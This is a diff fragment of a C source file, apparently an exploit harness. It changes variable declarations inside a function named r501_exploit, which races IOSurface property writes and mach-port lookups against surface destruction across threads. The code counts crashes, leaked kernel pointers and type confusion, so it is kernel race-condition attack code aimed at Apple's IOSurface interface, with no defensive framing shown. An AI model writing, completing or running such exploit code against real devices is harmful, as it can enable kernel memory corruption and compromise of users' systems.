@@ -28320,23 +28320,24 @@ static void r501_exploit(void) {
     CFDictionarySetValue(p1_props, CFSTR("IOSurfaceBytesPerRow"), p1brn);
     CFDictionarySetValue(p1_props, CFSTR("IOSurfacePixelFormat"), p1pfn);
 
-    _Atomic int p1_anomalies = 0;
-    _Atomic int p1_crashes = 0;
-    _Atomic int p1_kptrs = 0;
-    _Atomic int p1_type_confusion = 0;
+    __block int p1_anomalies = 0;
+    __block int p1_crashes = 0;
+    __block int p1_kptrs = 0;
+    __block int p1_type_confusion = 0;
 
     #define P1_RACE_ROUNDS 2000
     #define P1_NTHREADS 4
     #define P1_NSURFACES 8
 
-    IOSurfaceRef p1_surfs[P1_NSURFACES];
+    IOSurfaceRef p1_surfs_arr[P1_NSURFACES];
+    IOSurfaceRef *p1_surfs = p1_surfs_arr;
     for (int i = 0; i < P1_NSURFACES; i++) {
         p1_surfs[i] = IOSurfaceCreate(p1_props);
         if (!p1_surfs[i]) { rlog("  WARN: surf %d failed\n", i); }
     }
 
-    volatile int p1_go = 0;
-    volatile int p1_stop = 0;
+    __block volatile int p1_go = 0;
+    __block volatile int p1_stop = 0;
 
     /* Writer thread: rapidly set values on the surface */
     dispatch_queue_t p1_wq = dispatch_queue_create("p1.writer", DISPATCH_QUEUE_CONCURRENT);
@@ -28418,10 +28419,10 @@ static void r501_exploit(void) {
 
     /* Phase 1b: Race with different value types (dict vs data vs string) */
     rlog("\n  Phase 1b: Mixed-type property race\n");
-    _Atomic int p1b_type_mismatch = 0;
-    _Atomic int p1b_kptrs = 0;
-    volatile int p1b_go = 0;
-    volatile int p1b_stop = 0;
+    __block _Atomic int p1b_type_mismatch = 0;
+    __block _Atomic int p1b_kptrs = 0;
+    __block volatile int p1b_go = 0;
+    __block volatile int p1b_stop = 0;
 
     for (int t = 0; t < 2; t++) {
         dispatch_async(p1_wq, ^{
@@ -28533,7 +28534,7 @@ static void r501_exploit(void) {
         if (mp == MACH_PORT_NULL) { CFRelease(s); continue; }
 
         /* Race: lookup from mach port while destroying the surface */
-        volatile int p2_go = 0;
+        __block volatile int p2_go = 0;
         __block IOSurfaceRef looked_up = NULL;
         __block int lookup_ok = 0;
 
